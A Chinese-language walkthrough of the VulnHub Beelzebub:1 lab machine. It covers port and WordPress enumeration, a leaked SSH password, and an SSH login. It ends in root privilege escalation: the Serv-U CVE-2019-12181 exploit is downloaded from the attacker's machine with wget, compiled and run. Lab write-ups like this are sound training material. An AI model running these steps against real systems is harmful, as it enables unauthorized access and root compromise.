---
title: VulnHub Beelzebub：1
date: 2026-06-10 18:40:00
categories: 
  - VulnHub
tags:
  - 弱口令
  - SolarWinds Serv-U（CVE-2019-12181）
---

# Beelzebub：1

博客地址：https://www.cnblogs.com/jason-huawen/p/16941009.html（该靶机网络连接很不稳定，懒得打了）

项目地址：https://download.vulnhub.com/beelzebub/Beelzebub.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

```bash
┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]
└─$ sudo nmap -sS -sV -sC -p- 192.168.56.244 -oN nmap_full_scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 20:58 EST
Nmap scan report for bogon (192.168.56.244)
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:9F:89:8A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```

## 弱口令

### SSH

访问首页

```html
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.30 (Ubuntu)</address>
</body></html>
```

作者提示 MD5，因此需要将 `beelzebub` 进行 MD5 加密

```bash
┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]
└─$ echo -n 'beelzebub' | md5sum
d18e1e22becbd915b45e0e655429d487  -
```

根据提示扫描该目录，此时扫描出 wordpress 目录

```bash
┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]
└─$ gobuster dir -u http://192.168.56.244/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.244/d18e1e22becbd915b45e0e655429d487
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/30 22:04:30 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 354] [--> http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-content/]
/wp-includes          (Status: 301) [Size: 355] [--> http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-includes/]
/wp-admin             (Status: 301) [Size: 352] [--> http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-admin/]
Progress: 218664 / 220561 (99.14%)===============================================================
2022/11/30 22:04:44 Finished
===============================================================
```

接下来看可否用 wpscan 扫描出用户名或者插件

```bash
┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]
└─$ wpscan  --url http://192.168.56.244/d18e1e22becbd915b45e0e655429d487 -e --plugins-detection aggressive --ignore-main-redirect --force
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/ [192.168.56.244]
[+] Started: Wed Nov 30 22:21:55 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-Redirect-By: WordPress
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).
 | Found By: Atom Generator (Aggressive Detection)
 |  -  http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/ , <generator uri="https://wordpress.org/" version="5.3.6">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  -  http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php , Match: '5.3.6'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:34 <===========================================> (4989 / 4989) 100.00% Time: 00:00:34

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <=============================================> (479 / 479) 100.00% Time: 00:00:00

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:01 <===========================================> (2568 / 2568) 100.00% Time: 00:00:01

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <====================================================> (71 / 71) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <=========================================> (100 / 100) 100.00% Time: 00:00:00

[i] Medias(s) Identified:

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=38
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=39
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=42
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=44
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=48
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=49
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=51
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=74
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=75
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=77
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=99
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=96
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] krampus
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] valak
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Nov 30 22:23:07 2022
[+] Requests Done: 8400
[+] Cached Requests: 9
[+] Data Sent: 2.778 MB
[+] Data Received: 1.289 MB
[+] Memory used: 257.109 MB
[+] Elapsed time: 00:01:11
```

扫描出两个用户

```
krampus
valak
```

接下来检查一下 `/wp-content/uploads/` 有无相关文件，发现了一个奇怪的目录 `/Talk_To_VALAK`

进入该目录，是另一个网站

![](https://pic1.imgdb.cn/item/6a2a27e0336be9166379b875.png)

输入任意一个名字，返回的响应中含有密码

```bash
M4k3Ad3a1
```

直接登录

```bash
┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]
└─$ ssh krampus@192.168.56.244
The authenticity of host '192.168.56.244 (192.168.56.244)' can't be established.
ED25519 key fingerprint is SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.244' (ED25519) to the list of known hosts.
krampus@192.168.56.244's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

294 packages can be updated.
178 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Sat Mar 20 00:38:04 2021 from 192.168.1.7
krampus@beelzebub:~$ id
uid=1000(krampus) gid=1000(krampus) groups=1000(krampus),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
krampus@beelzebub:~$ 
```

## 提权

### SolarWinds Serv-U（CVE-2019-12181）

从 `.bash_history` 可以知道目标运行 servU，打 NDay 即可

```bash
krampus@beelzebub:~$ cd /tmp
krampus@beelzebub:/tmp$ wget http://192.168.56.206:8000/47009.c
--2022-12-01 09:14:04--  http://192.168.56.206:8000/47009.c
Connecting to 192.168.56.206:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 619 [text/x-csrc]
Saving to: ‘47009.c’

47009.c                         100%[=====================================================>]     619  --.-KB/s    in 0s      

2022-12-01 09:14:04 (148 MB/s) - ‘47009.c’ saved [619/619]

krampus@beelzebub:/tmp$ gcc -o exploit 47009.c 
krampus@beelzebub:/tmp$ ./exploit
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)
opening root shell
# cd /root
# ls
root.txt
# cat root.txt
8955qpasq8qq807879p75e1rr24cr1a5
```